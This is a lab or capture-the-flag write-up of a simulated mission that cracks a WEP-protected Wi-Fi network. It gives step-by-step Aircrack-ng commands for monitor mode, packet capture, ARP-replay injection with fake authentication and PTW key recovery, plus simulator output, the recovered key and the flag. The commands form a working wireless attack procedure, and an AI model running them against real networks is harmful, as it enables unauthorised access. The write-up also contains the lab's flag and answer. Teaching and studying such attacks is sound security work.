# M03 // HIGH: WEP Wi-Fi Crack

**Mission:** M03, WEP Wi-Fi Crack  
**Status:** Completed, 4/4 steps  
**Target SSID:** `ACME-SECURE-LEGACY`  
**Target BSSID:** `AA:BB:CC:DD:EE:FF`  
**Channel:** 6  
**Encryption:** WEP (RC4)  
**Wireless interface:** `wlan0` (managed) → `wlan0mon` (monitor)  
**Capture file:** `/home/kali/capture-01.cap`  
**Recovered WEP key:** `1A:4F:7E:C2:88`  
**Mission flag:** `a28af3d118142ab65b02599477bd698c`  
**Flag stored by lab:** `~/flags/flag2.txt`

## Mission overview

The objective was to demonstrate how a legacy WEP-protected wireless network can be assessed using the Aircrack-ng suite: switch a wireless interface into monitor mode, collect packets containing WEP initialization vectors (IVs), increase the rate of IV collection using ARP-request replay, and recover the WEP key with the PTW statistical attack.

| Step | Task | Main tool | Lab result |
|---|---|---|---|
| 1 | Enable monitor mode | `airmon-ng` | `wlan0mon` activated |
| 2 | Capture target WEP traffic | `airodump-ng` | 85,241 data packets initially |
| 3 | ARP replay | `aireplay-ng` | 127,841 data packets after replay |
| 4 | Recover WEP key | `aircrack-ng` | Key recovered and flag captured |

---

## Step 1: Monitor Mode

### Commands used

Initial discovery attempts:

```bash
sudo airmon-ng
iw dev
ifconfig -a
```

The lab simulator did not accept the first command as the required action and did not implement `iw dev` or `ifconfig -a`.

**Successful command:**

```bash
sudo airmon-ng start wlan0
```

### Parameters

| Part | Meaning |
|---|---|
| `sudo` | Run with elevated privileges |
| `airmon-ng` | Manage wireless interface monitor mode |
| `start` | Enable monitor mode |
| `wlan0` | Original wireless interface |

### Actual lab response

```text
# airmon-ng start wlan0
PHY     Interface   Driver      Chipset
phy0    wlan0       ath9k_htc   Atheros AR9271
        (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
        (mac80211 station mode vif disabled for [phy0]wlan0)
[+] Monitor mode active on wlan0mon
[note] All following commands use wlan0mon, not wlan0.
[+] Step 1/4 complete! Proceed to step 2.
```

### Interpretation

Monitor mode lets a compatible wireless adapter receive raw IEEE 802.11 frames on a tuned channel, including frames not addressed to the adapter. It differs from ordinary managed mode, where the interface typically communicates with an associated AP. All subsequent wireless commands use `wlan0mon`.

---

## Step 2: IV Capture and Analysis

### Successful command

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

### Parameters

| Parameter | Meaning |
|---|---|
| `sudo` | Run with elevated privileges |
| `airodump-ng` | Capture and display 802.11 frames and AP/client statistics |
| `-c 6` | Lock capture to channel 6 |
| `--bssid AA:BB:CC:DD:EE:FF` | Filter for the target AP |
| `-w capture` | Write capture data using the `capture` filename prefix |
| `wlan0mon` | Monitor-mode wireless interface |

### Actual lab response

```text
CH 6 ][ Elapsed: 1m ][ 09:45
 BSSID              PWR  Beacons  #Data   CH  ENC   ESSID
 AA:BB:CC:DD:EE:FF  -62  120      85,241  6   WEP   ACME-SECURE-LEGACY  <-- TARGET
 11:22:33:44:55:66  -78  89       12      1   WPA2  ACME-CORP
 BSSID              STATION            Rate  Frames
 AA:BB:CC:DD:EE:FF  F8:1E:DF:AA:CC:01  11    1,248  (client connected)
Writing to capture-01.cap -- 85,241 IVs collected so far
[note] #Data = IV count. ARP replay will push this to 100K+ fast.
[+] Step 2/4 complete! Proceed to step 3.
```

### Additional command attempted

```bash
airodump-ng -r /home/kali/capture-01.cap
```

The simulator returned the Step 2 replay, since Step 2 was already complete. The exercise uses a pre-made capture file rather than requiring real over-the-air collection.

### Interpretation

- **Target:** `ACME-SECURE-LEGACY`, BSSID `AA:BB:CC:DD:EE:FF`, channel 6.
- **Encryption:** WEP; the separate `ACME-CORP` WPA2 network is not part of this task.
- **Signal:** `PWR -62` (typically expressed as an approximate RSSI).
- **Initial data count:** 85,241.
- **Observed station:** `F8:1E:DF:AA:CC:01`.

WEP uses a 24-bit IV transmitted with encrypted frames. The small IV space, RC4-related weaknesses and key/IV construction make recovery of WEP keys practical after gathering suitable traffic. Strictly speaking, `#Data` is a packet count and need not equal the number of **distinct** IVs in every real capture; the simulator labels them equivalently.

---

## Step 3: ARP Replay for Faster IV Collection

### Command submitted

```bash
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h F8:1E:DF:AA:CC:01 wlan0mon
```

### Parameters

| Parameter | Meaning |
|---|---|
| `aireplay-ng` | Inject and replay 802.11 packets |
| `-3` | ARP-request replay attack mode |
| `-b AA:BB:CC:DD:EE:FF` | Target AP BSSID |
| `-h F8:1E:DF:AA:CC:01` | Source MAC address to place in injected frames |
| `wlan0mon` | Monitor-mode wireless interface |

### Actual lab response

The simulator showed these representative commands in its successful response (not exactly the same as the submitted command):

```text
# aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon
Association successful :-) (AID: 1)
# aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
Read 2841 packets (got 1223 ARP requests), sent 98421 packets...
Sending 1428 packets/sec
Data packets: 127,841 (and counting)
[+] IV count past 100K! Proceed to aircrack-ng.
[note] -1=fake auth, -3=ARP replay. Each ARP forces new encrypted reply.
[+] Step 3/4 complete! Proceed to step 4.
```

### Additional switches shown by the simulator

| Parameter | Meaning |
|---|---|
| `-1` | Fake authentication mode (not the same as ARP replay) |
| `0` | Immediate authentication attempt interval in the shown syntax |
| `-a AA:BB:CC:DD:EE:FF` | AP BSSID for fake authentication |

### Interpretation

In a WEP ARP replay attack, captured ARP requests are retransmitted so that the AP generates additional encrypted frames. This accelerates collection of key-recovery samples compared with passively waiting for traffic.

| Metric | Value |
|---|---:|
| Initial reported data packets | 85,241 |
| ARP requests observed by simulator | 1,223 |
| Packets sent in replay | 98,421 |
| Reported injection rate | 1,428 packets/s |
| Final reported data packets | 127,841 |
| Increase over initial count | 42,600 |

---

## Step 4: PTW Statistical Key Recovery

### Successful command

```bash
aircrack-ng -a 1 -z -b AA:BB:CC:DD:EE:FF /home/kali/capture-01.cap
```

### Parameters

| Parameter | Meaning |
|---|---|
| `aircrack-ng` | Analyze captured wireless packets and attempt key recovery |
| `-a 1` | Select WEP attack mode |
| `-z` | Select the PTW WEP attack; PTW is already the default in many modern versions |
| `-b AA:BB:CC:DD:EE:FF` | Select the target AP by BSSID |
| `/home/kali/capture-01.cap` | Existing capture file supplied by the lab |

### Actual lab response

```text
# aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
Opening capture-01.cap
Read 127841 packets.
   #  BSSID              ESSID                     Encryption
   1  AA:BB:CC:DD:EE:FF  ACME-SECURE-LEGACY        WEP (127841 IVs)
   Choosing first network as target.
   Attack will be restarted with 127841 ivs.
   PTW attack with 127841 ivs...
   [00:00:00] Tested 64 keys (got 127841 IVs)
   [00:00:01] Tested 512 keys
   [00:00:02] Tested 2048 keys
   [00:00:02] Tested 8192 keys
                         KEY FOUND! [ 1A:4F:7E:C2:88 ]  (ASCII: ACME)
   Decrypted correctly: 100%
[+] WEP KEY CRACKED -- Flag: a28af3d118142ab65b02599477bd698c
[note] PTW attack -- NOT brute force. Pure statistics in 2.41 seconds.
flag captured: a28af3d118142ab65b02599477bd698c
saved to ~/flags/flag2.txt
[+] Mission M03 complete: WEP Wi-Fi Crack
```

### Interpretation

- **Attack:** PTW (Pyshkin, Tews and Weinmann), a statistical WEP key-recovery technique that exploits weaknesses associated with RC4 key initialization.
- **Samples:** 127,841 IVs reported by the simulator.
- **Recovered WEP key:** `1A:4F:7E:C2:88` (five bytes, 40-bit WEP secret; commonly called 64-bit WEP when the 24-bit IV is included).
- **Lab-reported duration:** 2.41 seconds.
- **Validation:** `Decrypted correctly: 100%`.
- **Flag:** `a28af3d118142ab65b02599477bd698c`.

**Output fidelity note:** The simulator prints `(ASCII: ACME)` next to the recovered hex key, but the five bytes `1A 4F 7E C2 88` do **not** encode the literal ASCII string `ACME`. The authoritative recovered key for this exercise is the hexadecimal value shown in `KEY FOUND!`.

---

## Consolidated command reference

```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Capture WEP frames from the target
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 3. Replay ARP requests to stimulate additional encrypted frames
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h F8:1E:DF:AA:CC:01 wlan0mon

# 4. Recover the WEP key statistically from the capture
aircrack-ng -a 1 -z -b AA:BB:CC:DD:EE:FF /home/kali/capture-01.cap
```

## Final findings and lessons

1. Monitor mode enables collection of 802.11 frames that a managed interface would not normally expose.
2. Airodump-ng identified a WEP AP and collected an initial set of 85,241 data frames.
3. ARP replay increased the simulator's reported traffic to 127,841 IVs, illustrating how active injection can shorten capture time.
4. Aircrack-ng recovered the WEP key by PTW statistical analysis, without trying an ordinary wordlist.
5. WEP provides inadequate wireless security; replacement with modern WPA2-AES or WPA3 is the relevant mitigation rather than a longer WEP password.

### Mission result

**M03 complete: 4/4 steps.**

- **SSID:** `ACME-SECURE-LEGACY`
- **BSSID:** `AA:BB:CC:DD:EE:FF`
- **WEP key:** `1A:4F:7E:C2:88`
- **Flag:** `a28af3d118142ab65b02599477bd698c`
- **Flag path (lab):** `~/flags/flag2.txt`

*Prepared from the user-provided M03 terminal transcript. Lab responses are simulator outputs and not independent observations of physical wireless infrastructure.*
